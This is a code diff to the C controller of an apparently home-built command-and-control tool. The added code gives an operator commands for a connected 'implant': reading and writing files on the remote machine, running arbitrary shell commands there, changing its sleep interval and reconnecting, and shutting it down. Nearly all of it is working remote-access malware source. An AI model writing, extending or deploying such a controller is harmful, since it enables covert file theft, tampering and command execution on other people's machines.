@@ -5,8 +5,31 @@
 #include <unistd.h>
 #include <netdb.h>
 #include <string.h>
-
 #include "protocol.h"
+#include <stdlib.h>
+
+void handle_packet_response(Packet *response, int request_id, int client_fd, int controller_fd)
+{
+
+    if (response == NULL)
+    {
+
+        printf("ERROR:connection error \n");
+        close(client_fd);
+        close(controller_fd);
+        exit(1);
+    }
+
+    if (response->request_id != request_id)
+    {
+
+        printf("ERROR: request ID mismatch, expected %d got %d\n", request_id, response->request_id);
+        close(client_fd);
+        close(controller_fd);
+        free_packet(response);
+        exit(1);
+    }
+}
 
 void display_prompt()
 {
@@ -54,6 +77,7 @@ int main(int argc, char *argv[])
 {
 
     int controller_fd = socket(AF_INET, SOCK_STREAM, 0);
+    int client_fd = -1;
 
     if (controller_fd < 0)
     {
@@ -70,12 +94,12 @@ int main(int argc, char *argv[])
     if (bind(controller_fd, (struct sockaddr *)&server_ip_structure, sizeof(server_ip_structure)) < 0)
     {
 
-        perror("bind");
+        perror("bind:");
         close(controller_fd);
         return 1;
     }
 
-    printf("<Controller Listening on port: %d> \n", ntohs(server_ip_structure.sin_port));
+    printf("<Controller Listening on port: %d> \n\n", ntohs(server_ip_structure.sin_port));
 
     if (listen(controller_fd, 2) < 0)
     { // listening on port 8080
@@ -86,7 +110,6 @@ int main(int argc, char *argv[])
     }
 
     struct sockaddr_in client_ip_structure;
-    int client_fd;
     socklen_t size_of_client = sizeof(client_ip_structure);
 
     if ((client_fd = accept(controller_fd, (struct sockaddr *)&client_ip_structure, &size_of_client)) < 0) // This is blocking
@@ -97,32 +120,31 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    printf("<Succesfully established connection to implant, now waiting for HELLO............\n");
+    printf("<Succesfully established connection to implant, now waiting for HELLO............\n\n>");
 
     Packet *first_response = recieve_packet(client_fd);
 
     if (first_response == NULL || first_response->command_type != COMMAND_HELLO)
     {
-        printf("Unknown inital packet sent from implant! \n");
+        printf("Unknown inital packet sent from implant! \n\n");
         close(client_fd);
         close(controller_fd);
         return 1;
     }
-
+    print_packet_contents(first_response);
     free_packet(first_response); // free the packet
 
-    printf("Recieved HELLO from implant! \n");
+    int request_id = 0; // its 1 because the first message the implant sends is 0
+    int continue_loop = 1;
 
-    int request_id = 1; // its 1 because the first message the implant sends is 0
-
-    while (1)
+    while (continue_loop)
     { // while true, as we want the connection to last until we set a
 
         // scanf here
 
         Command user_choice = get_user_input();
 
-        printf("%d", user_choice);
+        printf("<USER PICKED:%d \n\n>", user_choice);
 
         switch (user_choice)
         {
@@ -137,25 +159,7 @@ int main(int argc, char *argv[])
 
             Packet *response = recieve_packet(client_fd);
 
-            if (response == NULL)
-            {
-
-                printf("ERROR:connection error \n");
-                close(client_fd);
-                close(controller_fd);
-                return 1;
-                // TODO:
-            }
-
-            if (response->request_id != request_id)
-            {
-
-                printf("ERROR:connection error \n");
-                close(client_fd);
-                close(controller_fd);
-                free_packet(response);
-                return 1;
-            }
+            handle_packet_response(response, request_id, client_fd, controller_fd);
 
             print_packet_contents(response);
             free_packet(response);
@@ -164,31 +168,163 @@ int main(int argc, char *argv[])
         }
 
         case COMMAND_READ_DATA:
+        {
+
+            char path[256];
+            printf("Enter the path to file to read: "); // prompt the user
+            fgets(path, sizeof(path), stdin);
+            path[strcspn(path, "\n")] = '\0'; // strip the newline
+            request_id++;
+            Packet cmd_packet = {COMMAND_READ_DATA, request_id, strlen(path), path};
+
+            send_packet(&cmd_packet, client_fd);
+
+            Packet *response = recieve_packet(client_fd);
+
+            handle_packet_response(response, request_id, client_fd, controller_fd);
+
+            print_packet_contents(response);
+            free_packet(response);
+            break;
+        }
 
             // payload is the path of the file to read from, need to prompt user
 
         case COMMAND_WRITE_DATA:
+        {
 
-            // need to craft the payload for the user (so take in user input, remember the format!), so give an option for the path and contents 
+            char path[256];
+            printf("Enter the path to file to write: "); // prompt the user
+            fgets(path, sizeof(path), stdin);
+            path[strcspn(path, "\n")] = '\0'; // strip the newline
+
+            char data[256];
+            printf("Enter the data to write:"); // prompt the user
+            fgets(data, sizeof(data), stdin);
+            data[strcspn(data, "\n")] = '\0'; // strip the newline
+
+            int path_len = strlen(path);
+            int data_len = strlen(data);
+
+            int total_bytes = 4 + path_len + data_len;
+
+            char *payload = (char *)malloc(total_bytes);
+
+            memcpy(payload, &path_len, 4);
+            memcpy(payload + 4, path, path_len);
+            memcpy(payload + 4 + path_len, data, data_len);
+            request_id++;
+            Packet write_data = {COMMAND_WRITE_DATA, request_id, total_bytes, payload};
+            send_packet(&write_data, client_fd);
+            free(payload);
+
+            Packet *response = recieve_packet(client_fd);
+
+            handle_packet_response(response, request_id, client_fd, controller_fd);
+            print_packet_contents(response);
+            free_packet(response);
+            break;
+        }
+
+            // need to craft the payload for the user (so take in user input, remember the format!), so give an option for the path and contents
 
         case COMMAND_RUN_CMD:
+        {
+
+            char cmd[256];
+            printf("Enter command to run: "); // prompt the user
+            fgets(cmd, sizeof(cmd), stdin);
+            cmd[strcspn(cmd, "\n")] = '\0'; // strip the newline
+            request_id++;
+            Packet cmd_packet = {COMMAND_RUN_CMD, request_id, strlen(cmd), cmd};
+
+            send_packet(&cmd_packet, client_fd);
+
+            Packet *response = recieve_packet(client_fd);
+
+            handle_packet_response(response, request_id, client_fd, controller_fd);
+
+            print_packet_contents(response);
+            free_packet(response);
+            break;
+        }
 
             // payload is the command, prompt user input
 
         case COMMAND_SET_SLEEP:
+        {
 
-            //prompt for user input
+            char sleep[256];
+            printf("Enter the time to sleep in seconds: "); // prompt the user
+            fgets(sleep, sizeof(sleep), stdin);
+            sleep[strcspn(sleep, "\n")] = '\0'; // strip the newline
+
+            int sleep_data = atoi(sleep);
+
+            char *payload = (char *)malloc(4);
+
+            memcpy(payload, &sleep_data, 4);
+            request_id++;
+            Packet set_sleep = {COMMAND_SET_SLEEP, request_id, 4, payload};
+            send_packet(&set_sleep, client_fd);
+            free(payload);
+
+            Packet *first_response = recieve_packet(client_fd);
+
+            handle_packet_response(first_response, request_id, client_fd, controller_fd);
+
+            print_packet_contents(first_response);
+            free_packet(first_response);
+
+            // reconnect
+            struct sockaddr_in client_ip_structure;
+            socklen_t size_of_client = sizeof(client_ip_structure);
+
+            if ((client_fd = accept(controller_fd, (struct sockaddr *)&client_ip_structure, &size_of_client)) < 0) // This is blocking
+            {
+
+                perror("accept");
+                close(controller_fd);
+                return 1;
+            }
+
+            Packet *second_response = recieve_packet(client_fd);
+
+            handle_packet_response(second_response, 0, client_fd, controller_fd);
+            print_packet_contents(second_response);
+
+            request_id = 0; // change request id to zero as we slept and reconnected!
+
+            free_packet(second_response);
+
+            break;
+        }
+            // so we have a char * and need this to be converted into a int *
+
+            // prompt for user input
 
             // payload is the seconds we sleep for
 
         case COMMAND_SHUTDOWN:
+        {
 
-            // no payload
+            request_id++;
+            Packet shutdown = {COMMAND_SHUTDOWN, request_id, 0, NULL};
+            send_packet(&shutdown, client_fd);
+            Packet *response = recieve_packet(client_fd);
+
+            handle_packet_response(response, request_id, client_fd, controller_fd);
+
+            print_packet_contents(response);
+            free_packet(response);
+            continue_loop = 0;
+            break;
+        }
 
         default:
         }
     }
-
+    close(client_fd);
     close(controller_fd);
 
     return 0;
